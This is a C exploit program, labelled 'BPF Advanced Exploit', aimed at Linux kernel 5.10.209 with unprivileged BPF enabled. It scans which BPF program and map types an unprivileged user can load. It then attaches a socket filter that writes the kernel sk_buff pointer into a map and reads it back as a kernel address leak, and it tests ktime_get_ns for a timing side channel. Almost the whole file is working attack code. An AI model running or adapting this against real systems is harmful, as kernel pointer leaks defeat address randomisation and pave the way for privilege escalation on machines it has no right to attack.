/*
 * BPF Advanced Exploit - Multiple Program Types
 * Target: Kernel 5.10.209-perf, unprivileged_bpf_disabled=0
 *
 * Tests various BPF program types for kernel info leak
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <linux/bpf.h>
#include <linux/filter.h>
#include <linux/if_ether.h>
#include <arpa/inet.h>
#include <netinet/in.h>

#ifndef __NR_bpf
#define __NR_bpf 280
#endif

static inline int bpf(int cmd, union bpf_attr *attr, unsigned int size)
{
    return syscall(__NR_bpf, cmd, attr, size);
}

/* BPF instruction macros */
#define BPF_LD_MAP_FD(DST, MAP_FD)                                                                                                 \
    ((struct bpf_insn){.code = BPF_LD | BPF_DW | BPF_IMM, .dst_reg = DST, .src_reg = BPF_PSEUDO_MAP_FD, .off = 0, .imm = MAP_FD}), \
        ((struct bpf_insn){.code = 0, .dst_reg = 0, .src_reg = 0, .off = 0, .imm = 0})

#define BPF_MOV64_IMM(DST, IMM) \
    ((struct bpf_insn){.code = BPF_ALU64 | BPF_MOV | BPF_K, .dst_reg = DST, .src_reg = 0, .off = 0, .imm = IMM})

#define BPF_MOV64_REG(DST, SRC) \
    ((struct bpf_insn){.code = BPF_ALU64 | BPF_MOV | BPF_X, .dst_reg = DST, .src_reg = SRC, .off = 0, .imm = 0})

#define BPF_ALU64_IMM(OP, DST, IMM) \
    ((struct bpf_insn){.code = BPF_ALU64 | (OP) | BPF_K, .dst_reg = DST, .src_reg = 0, .off = 0, .imm = IMM})

#define BPF_ALU64_REG(OP, DST, SRC) \
    ((struct bpf_insn){.code = BPF_ALU64 | (OP) | BPF_X, .dst_reg = DST, .src_reg = SRC, .off = 0, .imm = 0})

#define BPF_JMP_IMM(OP, DST, IMM, OFF) \
    ((struct bpf_insn){.code = BPF_JMP | (OP) | BPF_K, .dst_reg = DST, .src_reg = 0, .off = OFF, .imm = IMM})

#define BPF_STX_MEM(SIZE, DST, SRC, OFF) \
    ((struct bpf_insn){.code = BPF_STX | (SIZE) | BPF_MEM, .dst_reg = DST, .src_reg = SRC, .off = OFF, .imm = 0})

#define BPF_LDX_MEM(SIZE, DST, SRC, OFF) \
    ((struct bpf_insn){.code = BPF_LDX | (SIZE) | BPF_MEM, .dst_reg = DST, .src_reg = SRC, .off = OFF, .imm = 0})

#define BPF_ST_MEM(SIZE, DST, OFF, IMM) \
    ((struct bpf_insn){.code = BPF_ST | (SIZE) | BPF_MEM, .dst_reg = DST, .src_reg = 0, .off = OFF, .imm = IMM})

#define BPF_EXIT_INSN() \
    ((struct bpf_insn){.code = BPF_JMP | BPF_EXIT, .dst_reg = 0, .src_reg = 0, .off = 0, .imm = 0})

#define BPF_CALL_FUNC(FUNC) \
    ((struct bpf_insn){.code = BPF_JMP | BPF_CALL, .dst_reg = 0, .src_reg = 0, .off = 0, .imm = FUNC})

#define BPF_FUNC_map_lookup_elem 1
#define BPF_FUNC_map_update_elem 2
#define BPF_FUNC_get_prandom_u32 7
#define BPF_FUNC_ktime_get_ns 5
#define BPF_FUNC_get_smp_processor_id 8
#define BPF_FUNC_skb_load_bytes 26
#define BPF_FUNC_ringbuf_output 130
#define BPF_FUNC_ringbuf_reserve 131
#define BPF_FUNC_ringbuf_submit 132

static char verifier_log[65536];

int create_map(int type, int key_size, int val_size, int max_entries)
{
    union bpf_attr attr = {
        .map_type = type,
        .key_size = key_size,
        .value_size = val_size,
        .max_entries = max_entries,
    };
    return bpf(BPF_MAP_CREATE, &attr, sizeof(attr));
}

int try_prog_type(int prog_type, const char *name)
{
    struct bpf_insn insns[] = {
        BPF_MOV64_IMM(0, 0),
        BPF_EXIT_INSN(),
    };

    memset(verifier_log, 0, sizeof(verifier_log));

    union bpf_attr attr = {
        .prog_type = prog_type,
        .insns = (unsigned long long)insns,
        .insn_cnt = 2,
        .license = (unsigned long long)"GPL",
        .log_level = 1,
        .log_size = sizeof(verifier_log),
        .log_buf = (unsigned long long)verifier_log,
    };

    int fd = bpf(BPF_PROG_LOAD, &attr, sizeof(attr));
    if (fd >= 0)
    {
        printf("[+] %s (type=%d): ALLOWED\n", name, prog_type);
        close(fd);
        return 1;
    }
    else
    {
        printf("[-] %s (type=%d): %s\n", name, prog_type, strerror(errno));
        return 0;
    }
}

void scan_prog_types(void)
{
    printf("\n[*] Scanning allowed BPF program types...\n");
    printf("==========================================\n");

    struct
    {
        int type;
        const char *name;
    } types[] = {
        {BPF_PROG_TYPE_SOCKET_FILTER, "SOCKET_FILTER"},
        {BPF_PROG_TYPE_KPROBE, "KPROBE"},
        {BPF_PROG_TYPE_SCHED_CLS, "SCHED_CLS"},
        {BPF_PROG_TYPE_SCHED_ACT, "SCHED_ACT"},
        {BPF_PROG_TYPE_TRACEPOINT, "TRACEPOINT"},
        {BPF_PROG_TYPE_XDP, "XDP"},
        {BPF_PROG_TYPE_PERF_EVENT, "PERF_EVENT"},
        {BPF_PROG_TYPE_CGROUP_SKB, "CGROUP_SKB"},
        {BPF_PROG_TYPE_CGROUP_SOCK, "CGROUP_SOCK"},
        {BPF_PROG_TYPE_LWT_IN, "LWT_IN"},
        {BPF_PROG_TYPE_LWT_OUT, "LWT_OUT"},
        {BPF_PROG_TYPE_LWT_XMIT, "LWT_XMIT"},
        {BPF_PROG_TYPE_SOCK_OPS, "SOCK_OPS"},
        {BPF_PROG_TYPE_SK_SKB, "SK_SKB"},
        {BPF_PROG_TYPE_CGROUP_DEVICE, "CGROUP_DEVICE"},
        {BPF_PROG_TYPE_SK_MSG, "SK_MSG"},
        {BPF_PROG_TYPE_RAW_TRACEPOINT, "RAW_TRACEPOINT"},
        {BPF_PROG_TYPE_CGROUP_SOCK_ADDR, "CGROUP_SOCK_ADDR"},
        {BPF_PROG_TYPE_LWT_SEG6LOCAL, "LWT_SEG6LOCAL"},
        {BPF_PROG_TYPE_LIRC_MODE2, "LIRC_MODE2"},
        {BPF_PROG_TYPE_SK_REUSEPORT, "SK_REUSEPORT"},
        {BPF_PROG_TYPE_FLOW_DISSECTOR, "FLOW_DISSECTOR"},
        {BPF_PROG_TYPE_CGROUP_SYSCTL, "CGROUP_SYSCTL"},
        {BPF_PROG_TYPE_RAW_TRACEPOINT_WRITABLE, "RAW_TP_WRITABLE"},
        {BPF_PROG_TYPE_CGROUP_SOCKOPT, "CGROUP_SOCKOPT"},
        {BPF_PROG_TYPE_TRACING, "TRACING"},
        {BPF_PROG_TYPE_STRUCT_OPS, "STRUCT_OPS"},
        {BPF_PROG_TYPE_EXT, "EXT"},
        {BPF_PROG_TYPE_LSM, "LSM"},
        {BPF_PROG_TYPE_SK_LOOKUP, "SK_LOOKUP"},
        {BPF_PROG_TYPE_SYSCALL, "SYSCALL"},
        {0, NULL}};

    for (int i = 0; types[i].name; i++)
    {
        try_prog_type(types[i].type, types[i].name);
    }
}

void scan_map_types(void)
{
    printf("\n[*] Scanning allowed BPF map types...\n");
    printf("======================================\n");

    struct
    {
        int type;
        const char *name;
        int key_size;
        int val_size;
        int max_entries;
    } maps[] = {
        {BPF_MAP_TYPE_HASH, "HASH", 4, 8, 4},
        {BPF_MAP_TYPE_ARRAY, "ARRAY", 4, 8, 4},
        {BPF_MAP_TYPE_PROG_ARRAY, "PROG_ARRAY", 4, 4, 4},
        {BPF_MAP_TYPE_PERF_EVENT_ARRAY, "PERF_EVENT_ARRAY", 4, 4, 4},
        {BPF_MAP_TYPE_PERCPU_HASH, "PERCPU_HASH", 4, 8, 4},
        {BPF_MAP_TYPE_PERCPU_ARRAY, "PERCPU_ARRAY", 4, 8, 4},
        {BPF_MAP_TYPE_STACK_TRACE, "STACK_TRACE", 4, 8, 16},
        {BPF_MAP_TYPE_CGROUP_ARRAY, "CGROUP_ARRAY", 4, 4, 4},
        {BPF_MAP_TYPE_LRU_HASH, "LRU_HASH", 4, 8, 4},
        {BPF_MAP_TYPE_LRU_PERCPU_HASH, "LRU_PERCPU_HASH", 4, 8, 4},
        {BPF_MAP_TYPE_LPM_TRIE, "LPM_TRIE", 8, 8, 4},
        {BPF_MAP_TYPE_ARRAY_OF_MAPS, "ARRAY_OF_MAPS", 4, 4, 4},
        {BPF_MAP_TYPE_HASH_OF_MAPS, "HASH_OF_MAPS", 4, 4, 4},
        {BPF_MAP_TYPE_DEVMAP, "DEVMAP", 4, 4, 4},
        {BPF_MAP_TYPE_SOCKMAP, "SOCKMAP", 4, 4, 4},
        {BPF_MAP_TYPE_CPUMAP, "CPUMAP", 4, 4, 4},
        {BPF_MAP_TYPE_XSKMAP, "XSKMAP", 4, 4, 4},
        {BPF_MAP_TYPE_SOCKHASH, "SOCKHASH", 4, 4, 4},
        {BPF_MAP_TYPE_REUSEPORT_SOCKARRAY, "REUSEPORT_SOCKARRAY", 4, 4, 4},
        {BPF_MAP_TYPE_QUEUE, "QUEUE", 0, 8, 4},
        {BPF_MAP_TYPE_STACK, "STACK", 0, 8, 4},
        {BPF_MAP_TYPE_RINGBUF, "RINGBUF", 0, 0, 4096},
        {0, NULL, 0, 0, 0}};

    for (int i = 0; maps[i].name; i++)
    {
        union bpf_attr attr = {
            .map_type = maps[i].type,
            .key_size = maps[i].key_size,
            .value_size = maps[i].val_size,
            .max_entries = maps[i].max_entries,
        };
        int fd = bpf(BPF_MAP_CREATE, &attr, sizeof(attr));
        if (fd >= 0)
        {
            printf("[+] %s (type=%d): ALLOWED\n", maps[i].name, maps[i].type);
            close(fd);
        }
        else
        {
            printf("[-] %s (type=%d): %s\n", maps[i].name, maps[i].type, strerror(errno));
        }
    }
}

/* Test sk_buff pointer leak via socket filter */
int test_skb_pointer_leak(void)
{
    printf("\n[*] Testing sk_buff pointer leak...\n");
    printf("====================================\n");

    int map_fd = create_map(BPF_MAP_TYPE_ARRAY, 4, 64, 4);
    if (map_fd < 0)
        return -1;

    /* This program stores the sk_buff context pointer to the map
     * The context pointer (r1 at entry) might leak kernel info
     */
    struct bpf_insn insns[] = {
        /* Save sk_buff pointer (r1) to stack */
        BPF_STX_MEM(BPF_DW, 10, 1, -16), /* 0: [fp-16] = r1 (skb) */

        /* Map lookup */
        BPF_LD_MAP_FD(6, map_fd),                /* 1-2 */
        BPF_MOV64_REG(1, 10),                    /* 3 */
        BPF_ALU64_IMM(BPF_ADD, 1, -4),           /* 4 */
        BPF_ST_MEM(BPF_W, 10, -4, 0),            /* 5 */
        BPF_MOV64_REG(2, 1),                     /* 6 */
        BPF_MOV64_REG(1, 6),                     /* 7 */
        BPF_CALL_FUNC(BPF_FUNC_map_lookup_elem), /* 8 */
        BPF_JMP_IMM(BPF_JEQ, 0, 0, 5),           /* 9: NULL check */

        /* Store saved skb pointer to map value */
        BPF_LDX_MEM(BPF_DW, 1, 10, -16), /* 10: r1 = saved skb */
        BPF_STX_MEM(BPF_DW, 0, 1, 0),    /* 11: [map_val] = skb ptr */

        BPF_MOV64_IMM(0, 0), /* 12 */
        BPF_EXIT_INSN(),     /* 13 */

        BPF_MOV64_IMM(0, 0), /* 14 */
        BPF_EXIT_INSN(),     /* 15 */
    };

    memset(verifier_log, 0, sizeof(verifier_log));
    union bpf_attr attr = {
        .prog_type = BPF_PROG_TYPE_SOCKET_FILTER,
        .insns = (unsigned long long)insns,
        .insn_cnt = 16,
        .license = (unsigned long long)"GPL",
        .log_level = 2,
        .log_size = sizeof(verifier_log),
        .log_buf = (unsigned long long)verifier_log,
    };

    int prog_fd = bpf(BPF_PROG_LOAD, &attr, sizeof(attr));
    if (prog_fd < 0)
    {
        printf("[-] Program load failed: %s\n", strerror(errno));
        verifier_log[500] = 0;
        printf("Log: %s\n", verifier_log);
        close(map_fd);
        return -1;
    }

    printf("[+] Program loaded: fd=%d\n", prog_fd);

    /* Attach to socket and trigger */
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0)
    {
        perror("socket");
        close(prog_fd);
        close(map_fd);
        return -1;
    }

    if (setsockopt(sock, SOL_SOCKET, SO_ATTACH_BPF, &prog_fd, sizeof(prog_fd)) < 0)
    {
        printf("[-] Failed to attach BPF: %s\n", strerror(errno));
    }
    else
    {
        printf("[+] BPF program attached to socket\n");

        /* Send a packet to trigger the filter */
        struct sockaddr_in addr = {
            .sin_family = AF_INET,
            .sin_port = htons(12345),
            .sin_addr.s_addr = inet_addr("127.0.0.1"),
        };

        char data[] = "trigger";
        sendto(sock, data, sizeof(data), 0, (struct sockaddr *)&addr, sizeof(addr));
        printf("[*] Sent trigger packet\n");

        /* Read map value */
        unsigned long val = 0;
        int key = 0;
        union bpf_attr lookup = {
            .map_fd = map_fd,
            .key = (unsigned long long)&key,
            .value = (unsigned long long)&val,
        };

        if (bpf(BPF_MAP_LOOKUP_ELEM, &lookup, sizeof(lookup)) == 0)
        {
            printf("[+] Map value: 0x%lx\n", val);
            if (val > 0xFFFF000000000000UL)
            {
                printf("[!!!] KERNEL POINTER LEAKED: 0x%lx\n", val);
            }
        }
    }

    close(sock);
    close(prog_fd);
    close(map_fd);
    return 0;
}

/* Test ktime info for timing side channel */
int test_ktime_leak(void)
{
    printf("\n[*] Testing ktime for timing channel...\n");
    printf("========================================\n");

    int map_fd = create_map(BPF_MAP_TYPE_ARRAY, 4, 16, 1);
    if (map_fd < 0)
        return -1;

    struct bpf_insn insns[] = {
        BPF_LD_MAP_FD(6, map_fd),                /* 0-1 */
        BPF_MOV64_REG(1, 10),                    /* 2 */
        BPF_ALU64_IMM(BPF_ADD, 1, -4),           /* 3 */
        BPF_ST_MEM(BPF_W, 10, -4, 0),            /* 4 */
        BPF_MOV64_REG(2, 1),                     /* 5 */
        BPF_MOV64_REG(1, 6),                     /* 6 */
        BPF_CALL_FUNC(BPF_FUNC_map_lookup_elem), /* 7 */
        BPF_JMP_IMM(BPF_JEQ, 0, 0, 6),           /* 8 */

        BPF_MOV64_REG(7, 0),                  /* 9 */
        BPF_CALL_FUNC(BPF_FUNC_ktime_get_ns), /* 10 */
        BPF_STX_MEM(BPF_DW, 7, 0, 0),         /* 11 */

        BPF_MOV64_IMM(0, 0), /* 12 */
        BPF_EXIT_INSN(),     /* 13 */

        BPF_MOV64_IMM(0, 0), /* 14 */
        BPF_EXIT_INSN(),     /* 15 */
    };

    memset(verifier_log, 0, sizeof(verifier_log));
    union bpf_attr attr = {
        .prog_type = BPF_PROG_TYPE_SOCKET_FILTER,
        .insns = (unsigned long long)insns,
        .insn_cnt = 16,
        .license = (unsigned long long)"GPL",
        .log_level = 1,
        .log_size = sizeof(verifier_log),
        .log_buf = (unsigned long long)verifier_log,
    };

    int prog_fd = bpf(BPF_PROG_LOAD, &attr, sizeof(attr));
    if (prog_fd >= 0)
    {
        printf("[+] ktime_get_ns available in socket_filter\n");
        close(prog_fd);
    }
    else
    {
        printf("[-] ktime_get_ns not available: %s\n", strerror(errno));
    }

    close(map_fd);
    return 0;
}

int main(void)
{
    printf("============================================\n");
    printf("BPF Advanced Exploit - Type Scanning\n");
    printf("Kernel: 5.10.209-perf\n");
    printf("============================================\n");

    scan_prog_types();
    scan_map_types();
    test_skb_pointer_leak();
    test_ktime_leak();

    printf("\n============================================\n");
    printf("Scan Complete\n");
    printf("============================================\n");
    return 0;
}
